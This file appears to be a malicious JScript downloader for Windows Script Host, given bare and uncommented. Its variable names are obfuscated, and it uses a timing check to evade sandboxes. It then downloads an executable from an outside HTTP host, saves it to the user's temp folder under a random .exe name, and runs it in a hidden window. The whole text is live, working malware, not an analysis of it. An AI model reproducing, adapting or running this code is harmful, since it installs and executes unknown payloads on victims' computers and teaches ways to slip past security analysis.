var oJ = false;
var RH = "CreateObject";
var Dd = function Kf() {return WScript[RH]("WScript.Shell");}(), BW = 11;
var pK = "MSXML2.XMLHTTP";
var Wv = 2123213;
var N = 0;
function Rv(o){Dd["Run"](o, N, N);};
function aF(){return "" + pK;};
function x(Bq, Gh){N = N * 1; return Bq - Gh;};
function r(){return RH;};
/*@cc_on
  @if (@_win32 || @_win64)
    oJ = true;
  @end
@*/
if (oJ)
{
var m = "";
function k0(){return 22;};
var rI = 0; var Az = 0;
function rO()
{
var sd = new this["Date"]();
var Tp = sd["getUTCMilliseconds"]();
WScript["Sleep"](k0());
var sd = new this["Date"]();
var G = sd["getUTCMilliseconds"]();
WScript["Sleep"](k0());
var sd = new this["Date"]();
var k1 = sd["getUTCMilliseconds"]();
var rI = "d";
rI = x(G, Tp);
var Az = "Mi";
Az = x(k1, G);
m = "open";
return x(rI, Az);
}
var p0 = false;
var ha = false;
for (var Kn = N; Kn < k0() * 1; Kn++){if (rO() != N){
p0 = true; 
Az = "31" + 11 * rI + Az; 
ha = true; 
break;
}}
function k() {return ((p0 == true) && (p0 == ha)) ? 1 : N;};
if (p0 && k() && ha){
function vR() {return Dd["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "1S2ETQTrb7x.exe";};
 ja = aF();
 Ix = WScript[RH](ja);
 var Fb = 1;
 while (Fb){
try {
Ix[m]("GET", "http://kingsstaging.consines.in/l9osaw", false);
Ix["send"]();
M = "Sleep";
for (;;){WScript[M](k0() * 11); if (Ix["readystate"] >= 2 * 2) break;};
Fb = N;
} catch(TS){};
}
function a(j) {var q = (1, 2, 3, 4, 5, j); return q;};
Zi = WScript[r()]("ADODB.Stream");
ja = Zi;
ja[m]();
ja["type"] = a(1);
ja["write"](Ix["ResponseBody"]);
Zi["position"] = a(N);
ja["Save" + "ToFile"](vR(), 2);
Zi["c"+"lose"]();
p = vR();
Rv(p);
}
}

